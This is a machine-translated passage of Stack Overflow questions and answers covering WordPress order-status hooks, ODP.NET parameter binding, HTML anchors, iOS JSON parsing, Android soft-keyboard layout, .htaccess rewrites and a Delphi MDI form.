> 时间：2012-11-23T08:06:05.643

试试这个

```
INSERT INTO  lm_Artikel  (status)
select "NOK" from lm_Schwellwert S INNER JOIN lm_Artikel A
WHERE A.Bestand < S.Schwellwert 
```

# php - 发送关于从 WP 电子商务分派的工作的电子邮件

> ID：13524855
> 
> 赞同：0
> 
> 时间：2012-11-23T07:41:39.557
> 
> 标签：php, wordpress, email, e-commerce

我使用 WP 电子商务销售产品，只有在我检查了客户发送给我的一些信息后才能下载该产品。检查信息后，我想转到 WordPress 仪表板，将订单状态更改为“作业已调度”，然后触发一封新电子邮件给客户，说明下一步该做什么。

将某些触发事件或选项附加到“作业已调度”状态更改的任何想法或经验？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:21:01.463

虽然这个问题很老，但答案可能对某人有用......您可以使用 wpsc_update_purchase_log_status 挂钩触发此事件。

```
function purchaseLogStatusEvent( $id, $status, $old_status, $purchase_log ) {
    /************************
    status codes:
      1: Incomplete Sale
      2: Order Received
      3: Accepted Payment
      4: Job Dispatched
      5: Closed Order
      6: Payment Declined
    ************************/
    if ($status==4){
        //do your magic
    }

}
add_action('wpsc_update_purchase_log_status', 'purchaseLogStatusEvent', 9, 4 ); 
```

# asp.net - ORA-01008: 并非所有变量都被绑定，当它们都被绑定时

> ID：13524865
> 
> 赞同：1
> 
> 时间：2012-11-23T07:42:33.303
> 
> 标签：asp.net, sql, oracle

我在将我的 Oracle 查询放到一个以 C# 作为其代码的 ASP.Net 页面时遇到问题。正如您在标题中看到的那样，我收到错误**ORA-01008: not all variables bound** when the query is connected to the page。但是当我尝试在 Oracle SQL Developer 中运行查询时，它运行得很好。请帮我解决我的问题。

这是我的 ASP.Net 代码：

```
select 
      to_char(eventdate,'MM/DD/YYYY') as eventdate
      , workweek
      , shift
      , testerid
      , to_char(datefrom, 'MM/DD/YYYY HH24:MI:SS') as datefrom
      , to_char(dateto, 'MM/DD/YYYY HH24:MI:SS') as dateto
      , (((dateto - datefrom)*24)*60) as totalminutes
      , status
      , statusreason
      , serviceby
      , starjobreason
      , endjobreason
      , lotno
      , device
      , teststep
      , handlerid
      , handlertype
      , operatorid
      , operatorname
      , comments
      --, vendormodel
      from
      (
       with tbl_details as
         ( select
            *
            from
            (
            select 
            hm.resourceid
            , hm.calendarworkweek as workweek
            , hm.cdoname
            , hm.txndate
            , rsh.newstatusname
            , rsh.newreasonname
            , lead(jsh.joborderid) over (partition by hm.resourcename order by hm.resourcename, hm.historymainlineid, hm.txndate) as joborderid
            , last_value(weph.paramvalue ignore nulls) over (partition by hm.resourcename order by hm.resourcename, hm.historymainlineid, hm.txndate) as handlerid
            , last_value(hm.containername ignore nulls) over (partition by hm.resourcename order by hm.resourcename, hm.historymainlineid, hm.txndate) as lotno
            , last_value(hm.employeeid ignore nulls) over (partition by hm.resourcename order by hm.resourcename, hm.historymainlineid, hm.txndate) as employeeid
            , last_value(hm.specname ignore nulls) over (partition by hm.resourcename order by hm.resourcename, hm.historymainlineid, hm.txndate) as specname
            , last_value(p.brandname ignore nulls) over (partition by hm.resourcename order by hm.resourcename, hm.historymainlineid, hm.txndate) as packagecode
            , last_value(p.packagetype ignore nulls) over (partition by hm.resourcename order by hm.resourcename, hm.historymainlineid, hm.txndate) as packagetype
            , last_value(p.device ignore nulls) over (partition by hm.resourcename order by hm.resourcename, hm.historymainlineid, hm.txndate) as device
            , hm.comments
            , rd.vendormodel
            from historymainline hm 
            inner join resourcedef rd on hm.resourceid = rd.resourceid
            left join resourcestatushistory rsh on hm.historymainlineid = rsh.historymainlineid
            left join a_wipequipmenthistory weh on hm.containerid = weh.containerid and hm.resourceid = weh.equipmentid
            left join a_jobstarthistory jsh on hm.historymainlineid = jsh.historymainlineid
            left join a_wipequipmentparamshistory weph on weh.wipequipmenthistoryid = weph.wipequipmenthistoryid and weph.paramnamename = 'HANDLERID'
            left join product p on hm.productid = p.productid
            where hm.cdoname in ('TrackInLot','EquipmentSetStatus', 'JobStart') and hm.txndategmt > to_date(:startDate, 'MM/DD/YYYY')) 
            where cdoname = 'EquipmentSetStatus'),  
      tbl_details2 as (
            select 
             case when cast(to_char(nvl(dt.txndate, cldr.starttimestamp),'HH24.MISS') as float) < 6.0
                  then trunc(nvl(dt.txndate, cldr.starttimestamp)) - 1 else trunc(nvl(dt.txndate, cldr.starttimestamp)) end as eventdate
            , nvl(hml.calendarworkweek, cww.workweek) as workweek
            , case when cast(to_char(nvl(dt.txndate, cldr.starttimestamp),'HH24.MISS') as float) >= 6 
                  and  cast(to_char(nvl(dt.txndate, cldr.starttimestamp),'HH24.MISS') as float) < 18 then 'A' else 'B' end as shift
            , r.resourcename as testerid
            , nvl(dt.txndate, cldr.starttimestamp) as datefrom
            , lead(nvl(dt.txndate, cldr.starttimestamp)) over (partition by r.resourcename order by nvl(dt.txndate, cldr.starttimestamp)) as dateto
            , dt.newstatusname as status
            , dt.newreasonname as statusreason
            , af.fullname as serviceby
            , jph.jobreasonname as starjobreason
            , jphe.jobreasonname as endjobreason
            , dt.lotno as lotno
            , dt.device as device
            , dt.specname as teststep
            , dt.handlerid as handlerid
            , r.attr_09 as handlertype
            , ai.employeename as operatorid
            , ai.fullname as operatorname
            , ae.comments
            , r.vendormodel
            from resourcedef r 
              inner join  a_calendarshifts cldr on cldr.starttimestamp > (to_date(:startDate, 'MM/DD/YYYY')) + 6/24 and cldr.starttimestamp < (to_date(:endDate, 'MM/DD/YYYY')) + 6/24
              left join tbl_details dt on r.resourceid = dt.resourceid and dt.txndate between cldr.starttimestamp and cldr.endtimestamp
              inner join a_calendarworkweeks cww on dt.txndate between to_date(to_char(cww.startdate, 'MM/DD/YYYY'),'MM/DD/YYYY') and to_date(to_char(cww.enddate, 'MM/DD/YYYY'), 'MM/DD/YYYY')
              left join a_jobprogresshistory jph on dt.joborderid = jph.joborderid and jph.jobresultname = 'BEGIN' and upper(jph.fromstagename) like '%START%'
              left join a_jobprogresshistory jphe on dt.joborderid = jphe.joborderid and jphe.jobresultname = 'END'
              left join historymainline ae on jph.historymainlineid = ae.historymainlineid
              left join historymainline hml on ae.historymainlineid = hml.historymainlineid
              left join employee af on ae.employeeid = af.employeeid
              left join resourcedef ag on dt.handlerid = ag.resourcename
              left join location ah on r.locationid = ah.locationid
              left join employee ai on dt.employeeid = ai.employeeid
              where r.resourcename like :equipID and ah.locationname like '%' and r.attr_02 = 'TESTER'
              order by dt.txndate),

      tbl_details3 as (
              select 
                row_number() over (partition by aa.testerid order by aa.testerid, aa.eventdate, aa.datefrom desc) as numdata
                , row_number() over (partition by aa.testerid, aa.eventdate, aa.shift order by aa.testerid, aa.eventdate, aa.datefrom desc) as numdesc                
                , aa.eventdate
                , aa.workweek
                , aa.shift
                , aa.testerid
                , aa.datefrom
                , aa.dateto
                , aa.status
                , aa.statusreason
                , aa.serviceby
                , aa.starjobreason
                , aa.endjobreason
                , aa.lotno
                , aa.device
                , aa.teststep
                , aa.handlerid
                , aa.handlertype
                , aa.operatorid
                , aa.operatorname
                , aa.comments
                , aa.vendormodel
              from tbl_details2 aa) ,
        tbl_equipfirstdata as (
              select 
                row_number() over (partition by aa.testerid order by aa.testerid, aa.datefrom desc) as numdatdesc
                , row_number() over (partition by aa.testerid, aa.eventdate, aa.shift order by aa.testerid, aa.eventdate, aa.datefrom) as num                
                , aa.eventdate
                , aa.workweek
                , aa.shift
                , aa.testerid
                , aa.datefrom
                , aa.dateto
                , aa.status
                , aa.statusreason
                , aa.serviceby
                , aa.starjobreason
                , aa.endjobreason
                , aa.lotno
                , aa.device
                , aa.teststep
                , aa.handlerid
                , aa.handlertype
                , aa.operatorid
                , aa.operatorname
                , aa.comments
                , aa.vendormodel
              from tbl_details2 aa
              )

      select 
                ba.eventdate
                , ba.workweek
                , ba.shift
                , ba.testerid
                , ba.datefrom
                , (case when ba.shift = 'A' and ba.numdesc = 1 then trunc(ba.eventdate) + 18/24 
                       when ba.shift = 'B' and ba.numdesc = 1  then trunc(ba.eventdate + 1) + 6/24 else ba.dateto end) as dateto
                , ba.status
                , ba.statusreason
                , ba.serviceby
                , ba.starjobreason
                , ba.endjobreason
                , ba.lotno
                , ba.device
                , ba.teststep
                , ba.handlerid
                , ba.handlertype
                , ba.operatorid
                , ba.operatorname
                , ba.comments
                , ba.vendormodel
        from tbl_details3 ba
    union all
             select 
                 case when ba.shift = 'B' then ba.eventdate + 1 else ba.eventdate end as eventdate
                , ba.workweek
                , case when ba.shift = 'B' then 'A'
                      when ba.shift = 'A' and ba.dateto > (trunc(ba.eventdate) + 18/24) then 'B' else ba.shift end as shift
                , ba.testerid
                , case when ba.shift = 'B' then (trunc(ba.eventdate + 1) + 6/24)
                     when ba.shift = 'A' and ba.dateto > (trunc(ba.eventdate) + 18/24) then (trunc(ba.eventdate) + 18/24) else ba.datefrom end as datefrom
                , case when ba.shift = 'B' and ba.dateto > (trunc(ba.eventdate + 1) + 18/24)  then (trunc(ba.eventdate + 1) + 18/24) else ba.dateto end as dateto
                , ba.status
                , ba.statusreason
                , ba.serviceby
                , ba.starjobreason
                , ba.endjobreason
                , ba.lotno
                , ba.device
                , ba.teststep
                , ba.handlerid
                , ba.handlertype
                , ba.operatorid
                , ba.operatorname
                , ba.comments
                , ba.vendormodel
        from tbl_details3 ba
            where ba.numdesc = 1 and cast(to_char(ba.datefrom,'HH24.MISS') as float) <> 6.0 
                  and cast(to_char(ba.datefrom,'HH24.MISS') as float) <> 18.0 
                  and cast(to_char(ba.dateto,'HH24.MISS') as float) <> 18.0
                  and ba.shift = 'A'                  
   union all
             select 
                 case when ba.shift = 'B' then eventdate + 1 else ba.eventdate end as eventdate
                , ba.workweek
                , case when ba.shift = 'B' then 'A' else ba.shift end as shift
                , ba.testerid
                , case when ba.shift = 'B' then (trunc(ba.eventdate + 1) + 6/24)  else datefrom end as datefrom
                , case when ba.shift = 'B' and ba.dateto > (trunc(ba.eventdate + 1) + 18/24) then (trunc(ba.eventdate + 1) + 18/24) else ba.dateto end as dateto
                , ba.status
                , ba.statusreason
                , ba.serviceby
                , ba.starjobreason
                , ba.endjobreason
                , ba.lotno
                , ba.device
                , ba.teststep
                , ba.handlerid
                , ba.handlertype
                , ba.operatorid
                , ba.operatorname
                , ba.comments
                , ba.vendormodel
        from tbl_details3 ba
            where ba.numdesc = 1  and cast(to_char(ba.datefrom,'HH24.MISS') as float) <> 6.0 and ba.shift = 'B' and cast(to_char(ba.dateto,'HH24.MISS') as float) <> 6.0
     union all
             select 
                ba.eventdate
                , ba.workweek
                , ba.shift
                , ba.testerid
                , (case when ba.shift = 'A' then trunc(ba.eventdate) + 6/24 
                        when ba.shift = 'B'  then trunc(ba.eventdate) + 18/24 else ba.datefrom  end) as datefrom
                ,(case when ba.shift = 'B'  then ba.datefrom else ba.dateto  end) as dateto
                , ba.status
                , ba.statusreason
                , ba.serviceby
                , ba.starjobreason
                , ba.endjobreason
                , ba.lotno
                , ba.device
                , ba.teststep
                , ba.handlerid
                , ba.handlertype
                , ba.operatorid
                , ba.operatorname
                , ba.comments
                , ba.vendormodel
        from tbl_details3 ba
    where ba.numdata = 1 and cast(to_char(datefrom,'HH24.MISS') as float) <> 6.0 and cast(to_char(datefrom,'HH24.MISS') as float) <> 18.0 and ba.shift = 'B' and cast(to_char(dateto,'HH24.MISS') as float) <> 18.0)
where eventdate BETWEEN ((TRUNC(to_date(:startDate, 'MM/DD/YYYY'))) + 6/24) AND (trunc(to_date(:endDate, 'MM/DD/YYYY')) + 6/24) and teststep is not null and testerid like :equipID and vendormodel like :venmod and handlertype like :handType or handlerid like :handID or operatorid like :operID and handlerid is not null --and rownum > 1
order by testerid, eventdate, datefrom 
```

下面是我背后的代码：

```
protected void btnFilter_Click(object sender, EventArgs e)
        {
            Session["startDate"] = string.Empty;
            Session["endDate"] = string.Empty;
            Session["equipID"] = string.Empty;
            Session["venmod"] = string.Empty;
            Session["handID"] = string.Empty;
            Session["handType"] = string.Empty;
            Session["operID"] = string.Empty;

            if (String.IsNullOrEmpty(txtDateFrom.Text))
            {
                Session["startDate"] = DateTime.Now.AddDays(-1).Date.ToShortDateString();
                txtDateFrom.Text = DateTime.Now.AddDays(-1).Date.ToShortDateString();
            }
            else
            {
                Session["startDate"] = txtDateFrom.Text.ToString();
            }

            if (String.IsNullOrEmpty(txtDateTo.Text))
            {
                Session["endDate"] = DateTime.Now.Date.ToShortDateString();
                txtDateTo.Text = DateTime.Now.Date.ToShortDateString();
            }
            else
            {
                Session["endDate"] = txtDateTo.Text.ToString();
            }

            if (ddlTesterID.SelectedItem.Value.ToString() == "")
            {
                Session["equipID"] = "%".ToString();
            }
            else
            {
                Session["equipID"] = ddlTesterID.SelectedItem.Value.ToString();
            }

            if (ddlTesterType.SelectedItem.Value.ToString() == "")
            {
                Session["venmod"] = "%".ToString();
            }
            else
            {
                Session["venmod"] = ddlTesterType.SelectedItem.Value.ToString();
            }

            if (ddlHandlerID.SelectedItem.Value.ToString() == "")
            {
                Session["handID"] = "%".ToString();
            }
            else
            {
                Session["handID"] = ddlHandlerID.SelectedItem.Value.ToString();
            }

            if (ddlHandlerType.SelectedItem.Value.ToString() == "")
            {
                Session["handType"] = "%".ToString();
            }
            else
            {
                Session["handType"] = ddlHandlerType.SelectedItem.Value.ToString();
            }

            if (String.IsNullOrEmpty(txtOperatorID.Text))
            {
                Session["operID"] = "%".ToString();
            }
            else
            {
                Session["operID"] = txtOperatorID.Text.ToString();
            }

            //X.MessageBox.Alert("Warning", Session["venmod"].ToString()).Show();

            UltraWebGrid1.DataSourceID = EDTDS.ID;
            UltraWebGrid1.DataBind();
        } 
```

这是 SqlDataSource：

```
<asp:SqlDataSource ID="EDTDS" runat="server" 
           ConnectionString="<%$ ConnectionStrings:Camstar %>" 
            ProviderName="<%$ ConnectionStrings:Camstar.ProviderName %>"  SelectCommand="select ..."
            <SelectParameters>
                <asp:SessionParameter ConvertEmptyStringToNull="False" Name="startDate" 
                    SessionField="startDate" />
                <asp:SessionParameter ConvertEmptyStringToNull="False" Name="endDate" 
                    SessionField="endDate" />
                <asp:SessionParameter ConvertEmptyStringToNull="False" Name="equipID" 
                    SessionField="equipID" />
                <asp:SessionParameter ConvertEmptyStringToNull="False" Name="venmod" 
                    SessionField="venmod" />
                <asp:SessionParameter ConvertEmptyStringToNull="False" Name="handType" 
                    SessionField="handType" />
                <asp:SessionParameter ConvertEmptyStringToNull="False" Name="handID" 
                    SessionField="handID" />
                <asp:SessionParameter ConvertEmptyStringToNull="False" Name="operID" 
                    SessionField="operID" />
            </SelectParameters>
        </asp:SqlDataSource> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T08:19:33.953

此错误通常发生在 ODP.NET 的情况下。问题在于 OracleCommand 在将查询参数与提供的参数匹配时的默认行为。默认情况下使用*位置*方法而不是*名称*方法。实际上，添加到命令中的每个参数都将按原样使用，而不管名称如何，如果您在查询文本中引用一个参数两次，那么您必须为其添加两次值！

可以通过设置`BindByName`为`true`on来覆盖此默认行为，`OracleCommad`但如果`SqlDataSource`您无权访问它并且您需要以正确的顺序多次提供值：

```
<asp:SqlDataSource ID="EDTDS" runat="server" ConnectionString="<%$ ConnectionStrings:Camstar %>" ProviderName="<%$ ConnectionStrings:Camstar.ProviderName %>" SelectCommand="select ..."
    <SelectParameters>
        <asp:SessionParameter ConvertEmptyStringToNull="False" Name="startDate" SessionField="startDate" />
        <asp:SessionParameter ConvertEmptyStringToNull="False" Name="startDate" SessionField="startDate" />
        <asp:SessionParameter ConvertEmptyStringToNull="False" Name="endDate"  SessionField="endDate" />
        <asp:SessionParameter ConvertEmptyStringToNull="False" Name="equipID" SessionField="equipID" />
        <asp:SessionParameter ConvertEmptyStringToNull="False" Name="startDate" SessionField="startDate" />
        <asp:SessionParameter ConvertEmptyStringToNull="False" Name="endDate"  SessionField="endDate" />
        <asp:SessionParameter ConvertEmptyStringToNull="False" Name="equipID" SessionField="equipID" />
        <asp:SessionParameter ConvertEmptyStringToNull="False" Name="venmod" SessionField="venmod" />
        <asp:SessionParameter ConvertEmptyStringToNull="False" Name="handType" SessionField="handType" />
        <asp:SessionParameter ConvertEmptyStringToNull="False" Name="handID" SessionField="handID" />
        <asp:SessionParameter ConvertEmptyStringToNull="False" Name="operID" SessionField="operID" />
    </SelectParameters>
</asp:SqlDataSource> 
```

（我希望我没有错过任何一个）

作为替代方案，您可以考虑创建自己的从 ODP.NET 派生的提供程序，并`BindByName`进行调整。

# javascript - 锚点点击并保持页面位置？

> ID：13524866
> 
> 赞同：9
> 
> 时间：2012-11-23T07:42:45.873
> 
> 标签：javascript, html

在我的页面中有一些没有链接的锚点，如下所示：

```
<a href="#">Anchor</a> 
```

当我单击页面底部的锚点时，页面正在滚动到顶部。如果我点击链接，我想保持页面位置。我怎样才能做到这一点。（没有js对我更好）

我希望，我可以解释。

提前致谢。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-11-23T07:45:38.270

你仍然必须使用 JS，但你可以内联：

```
<a href="javascript:void(0);">Test</a>​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ 
```

**演示：http: [//jsfiddle.net/7ppZT/](http://jsfiddle.net/7ppZT/)**

或者，您可以捕获事件：

```
$('a[href^="#"]').click(function(e) {
    e.preventDefault();
}); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-23T07:44:42.963

您可以将锚点放在页面中您想要的任何位置。

```
<a href="#stophere">Anchor</a>

<a id='stophere'>Bottom Of Page</a> 
```

然后，链接将转到命名的锚点。只要在你想停下来的地方坚持那个元素。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T07:46:31.613

要解决此问题，我使用此代码，**它是脚本解决方案，但适用于所有浏览器**

```
<a href="javascript:void(0)">Anchor</a> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-23T07:47:02.130

```
<a href="#noname">Anchor</a> 
```

确保`noname`您没有使用`id`任何标签的`name`属性或标签的属性`a`。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-23T07:49:39.007

你必须设置一个名称并在`#`这样的后面添加名称

```
<a name="adsf" href="#adsf">Anchor</a> 
```

# iphone - iPhone SDK 上的 JSON 解析

> ID：13524871
> 
> 赞同：0
> 
> 时间：2012-11-23T07:43:05.453
> 
> 标签：iphone, objective-c, ios, xcode, json

我有一个特定的json：

```
[
    {
        "id"        : 42422422,
        "created"   : 1329684013,
        "name"          : "Test"
    },
    {
        "id"        : 42422423,
        "created"   : 1329684015,
        "name"          : "Test 123"
    },
        {
          ...
        }
] 
```

解析这个没问题，但是当网络服务器出错时，这个 JSON 被返回：

```
{
    "error" : {
        "code"      : "511",
        "message"   : "JSON error",
        "extra" : {
            "some"      : "text",
            "someextra" : "text"
        }
    }
} 
```

我试过用这个：

```
if ([jsonArray valueForKey:@"error"] != nil) { 
```

但这不起作用，因为如果我输出它的值，它就是一个'null's'数组

我怎样才能检查这个？（我知道我可以使用`NSRange`，但我认为必须有更好的方法对吗？

我像这样解析 JSON：

```
NSDictionary *jsonArray = [NSJSONSerialization JSONObjectWithData:responseData options:NSJSONReadingMutableContainers error: &e]; 
```

responseData 来自 NSURLConnection 的 connectionDidFinishLoading 方法。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-23T07:49:27.433

您应该首先检查您的结果是数组还是字典。

```
if ([jsonArray isKindOfClass:[NSArray class]]) {
     //process results
} else if ([jsonArray isKindOfClass:[NSDictionary class]]) {
    NSDictionary *errorInfo = [(NSDictionary *)jsonArray objectForKey:@"error"];
    //handle error...
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-11-22T05:43:10.253

检查下面的链接并简单地解析 Json。

[获取 Nextbelt 的演示](http://ge.tt/922W03h1/v/0?c)

[下载 JSON 框架](http://ge.tt/7z6eYJ11/v/0?c)

```
 NSString *appurl =[NSString stringWithFormat:@"your link"];
 appurl = [appurl stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
 NSMutableURLRequest *request=[NSMutableURLRequest requestWithURL:[NSURL URLWithString:appurl]];
 NSData *returnData = [NSURLConnection sendSynchronousRequest:request returningResponse: nil error: nil ];
 NSString  *returnString = [[NSString alloc] initWithData:returnData encoding: NSUTF8StringEncoding];
 NSMutableDictionary *deletdict=[returnString JSONValue];
 if([[deletdict objectForKey:@"success"] isEqualToString:@"False"])
    {
        NSLog(@"Unsuccess...");

    }
 else
    {
        NSLog(@"success...");
    } 
```

AND Post方法是这个

```
NSString *post =[NSString stringWithFormat:@"AgencyId=STM&UserId=1&Type=1&Date=%@&Time=%@&Coords=%@&Image=h32979`7~U@)01123737373773&SeverityLevel=2",strDateLocal,strDateTime,dict];
NSData *postData = [post dataUsingEncoding:NSASCIIStringEncoding allowLossyConversion:YES];
NSString *postLength = [NSString stringWithFormat:@"%d",[postData length]];
NSMutableURLRequest *request = [[[NSMutableURLRequest alloc] init] autorelease];
[request setURL:[NSURL URLWithString:[NSString stringWithFormat:@"http://google/places"]]];
[request setHTTPMethod:@"POST"];
[request setValue:postLength forHTTPHeaderField:@"Content-Length"];
[request setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
[request setHTTPBody:postData];
NSError *error;
NSURLResponse *response;
NSData *urlData=[NSURLConnection sendSynchronousRequest:request returningResponse:&response error:&error];
NSString *str=[[NSString alloc]initWithData:urlData encoding:NSUTF8StringEncoding];

NSMutableArray *SubLiveArray=[str JSONValue]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T08:21:06.940

对于非错误 JSON 有效负载，您有一个顶级数组（由开头 [ 注明），而对于错误 JSON 有效负载，您没有。

```
{
    "error" : {
        "code"      : "511",
        "message"   : "JSON error",
        "extra" : {
            "some"      : "text",
            "someextra" : "text"
        }
    }
} 
```

错误代码是一个嵌套的字典对象，因此您可以使用以下内容来解析它：

```
NSDictionary* json = [NSJSONSerialization
                              JSONObjectWithData:responseData
                              options:kNilOptions
                              error:&error];

NSString *errorCode = [NSString stringWithFormat:@"%@",[(NSDictionary*)[json objectForKey:@"error"]objectForKey:@"code"]]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-12-11T07:17:00.590

```
-(void)SerchpageApicall
{
    NSString *main_url=@"yourlink";
    NSString *appurl=[NSString stringWithFormat:@"%@&address=%@",main_url,_txt_Search_address.text];

    appurl = [appurl stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
    NSURL *url=[NSURL URLWithString:appurl];
    NSURLRequest* requestVersion = [NSURLRequest requestWithURL:url
                                                    cachePolicy:NSURLRequestReloadIgnoringCacheData
                                                timeoutInterval:5.0];
    NSHTTPURLResponse* response = nil;
    NSError* error = nil;
    NSData *returnData = [NSURLConnection sendSynchronousRequest:requestVersion returningResponse:&response error:&error ];
    NSString  *returnString = [[NSString alloc] initWithData:returnData encoding: NSUTF8StringEncoding];
    NSMutableDictionary *dict=[returnString JSONValue];
} 
```

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2012-11-23T07:44:52.553

使用`[jsonArray objectForKey:@"error"]`而不是`valueForKey`

# android - 当键盘出现android时如何停止图像挤压

> ID：13524873
> 
> 赞同：1
> 
> 时间：2012-11-23T07:43:19.637
> 
> 标签：android, android-layout

我在 800x420 和 Galaxy sl 和 s2 移动设备上测试我的应用程序。在银河 sl 中，当我按下编辑文本键盘时，会出现但背景图像没有被挤压，但在银河 s2 中它被挤压。两者的显示尺寸相同，galaxy sl 使用姜饼。

这是我的代码

```
 <?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:background="@drawable/page1background"
    android:paddingRight="@dimen/padding_large" >

    <TextView
        android:id="@+id/textView1"
        android:layout_width="196dp"
        android:layout_height="wrap_content"
        android:layout_centerHorizontal="true"
        android:gravity="center_horizontal"
        android:paddingTop="@dimen/padding_Title_Top"
        android:text="@string/text"
        android:textAppearance="?android:attr/textAppearanceMedium" />

    <LinearLayout
        android:id="@+id/linearLayout1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_below="@id/textView1"
        android:layout_centerHorizontal="true" >

        <View
            android:id="@+id/view1"
            android:layout_width="fill_parent"
            android:layout_height="25dp" />
    </LinearLayout>

    <ScrollView
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_above="@id/linearLayout2"
        android:layout_below="@id/linearLayout1"
        android:layout_gravity="center"
        android:padding="@dimen/padding_maintextview" >

        <LinearLayout
            android:id="@+id/linearLayout5"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content" >

            <EditText
                android:id="@+id/textView2"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_gravity="center"
                android:layout_marginBottom="23dp"
                android:background="@null"
                android:focusableInTouchMode="false"
                android:gravity="right"
                android:inputType="none"
                android:padding="@dimen/padding_maintextview"
                android:text="@string/text"
                android:textAppearance="?android:attr/textAppearanceMedium" />
        </LinearLayout>
    </ScrollView>

    <LinearLayout
        android:id="@+id/linearLayout2"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentBottom="true"
        android:layout_centerHorizontal="true" >

        <View
            android:id="@+id/view2"
            android:layout_width="fill_parent"
            android:layout_height="100dp" />
    </LinearLayout>

    <LinearLayout
        android:id="@+id/linearLayout3"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentBottom="true"
        android:layout_centerHorizontal="true" >

        <ImageButton
            android:id="@+id/back_arrow"
            android:layout_width="0dip"
            android:layout_height="wrap_content"
            android:layout_marginBottom="30dp"
            android:layout_marginRight="45dp"
            android:layout_weight=".5"
            android:background="@drawable/backbut"
            android:contentDescription="@string/Description"
            android:onClick="onClickBtn"
            android:src="@drawable/backarrowpress" />

        <ImageButton
            android:id="@+id/copyButton"
            android:layout_width="0dip"
            android:layout_height="wrap_content"
            android:layout_marginLeft="45dp"
            android:layout_weight=".5"
            android:background="@drawable/copy"
            android:contentDescription="@string/Description"
            android:onClick="onClickBtn" />
    </LinearLayout>

</RelativeLayout> 
```

如果有人可以帮助我纠正这个问题。提前谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:45:54.133

您好尝试将 android:windowSoftInputMode="adjustPan" 添加到 manifest.xml 中的活动标记中。

像下面

```
 <activity
            android:name=".youractivitywhichyouhaveproblem" android:windowSoftInputMode="adjustResize">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-04-14T15:08:38.517

请尝试以下方法。

android:windowSoftInputMode="stateVisible|adjustPan"

将此条目放在清单文件中。

# php - WordPress .htaccess 不适用于重写

> ID：13524875
> 
> 赞同：5
> 
> 时间：2012-11-23T07:43:35.863
> 
> 标签：php, wordpress, .htaccess

当永久链接已经启用时，我们可以重写 WordPress 页面`/ghij`以显示页面的内容吗？`/faq`

我的页面是`example.com?page_id=70&category=Footage`. 启用永久链接后，它显示`example.com/video-category?category=Footage`. 我希望它看起来像`example.com/category/Footage`。

对此的任何帮助将不胜感激。

当前`.htaccess`：

```
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule . /index.php [L]
</IfModule> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T07:57:59.330

```
# BEGIN WordPress
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /

    RewriteCond %{QUERY_STRING} ^page_id=([0-9]*)&category=(.*)$
    RewriteRule ^(.*)$ /%1/%2? [R=301,L]

    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule . /index.php [L]
</IfModule>
# END WordPress 
```

作品。并从：http://test.com/index.php?page_id=70&category=Footage 重定向到：
[http](http://test.com/index.php?page_id=70&category=Footage)
:
[//test.com/70/Footage](http://test.com/70/Footage)

**更新：**

```
RewriteRule ^(.*)/(.*)$ /index.php?page_id=$1&category=$2 [L] 
```

此规则有效并进行**内部重定向**（不更改 url）从：
[http](http://test.com/70/Footage)
://test.com/70/Footage 到：
[http ://test.com/index.php?page_id=70&category=Footage](http://test.com/index.php?page_id=70&category=Footage)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T04:47:22.717

我希望以下插件对您有更多帮助

[http://wordpress.org/extend/plugins/permalink-editor/](http://wordpress.org/extend/plugins/permalink-editor/)

请检查此插件，它会根据需要重写永久链接，而无需任何编码知识。

# delphi - 子窗体的顶部低于父窗体

> ID：13524877
> 
> 赞同：1
> 
> 时间：2012-11-23T07:43:40.900
> 
> 标签：delphi, parent-child, mdi, childwindow

我在德尔福有一个父母和孩子的形式。父窗体包含一个 TControlBar，在 ControlBar 的顶部有两个工具栏。

在其中一个工具栏上有一个用于打开子窗体的按钮。显示子窗体时，窗体的顶部位于控制栏下方，子窗体的顶部隐藏在父窗体下方。

我认为问题在于我的子表单正在使用父表单的全部部分作为显示区域。

据我所知，我认为子窗体应该使用 ClientWidth 和 ClientHeight 作为显示区域。ClientWidth 和 Clientheight 是自动设置的。

我希望子窗体使用剩余区域（工具栏除外）进行显示。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T01:06:11.183

